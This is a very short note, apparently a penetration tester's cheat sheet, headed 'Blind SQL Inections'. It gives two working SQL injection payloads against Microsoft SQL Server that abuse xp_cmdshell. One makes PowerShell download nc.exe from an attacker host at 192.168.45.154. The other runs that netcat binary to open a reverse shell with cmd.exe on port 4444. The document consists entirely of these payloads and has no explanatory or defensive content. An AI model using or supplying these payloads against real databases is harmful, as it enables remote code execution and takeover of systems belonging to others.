## Blind SQL Inections

admin';EXEC master.dbo.xp_cmdshell "powershell.exe iex (iwr http://192.168.45.154/nc.exe -OutFile C:\Windows\Temp\nc.exe)";-- 

admin';EXEC xp_cmdshell 'C:\Windows\Temp\nc.exe 192.168.45.154 4444 -e cmd.exe';--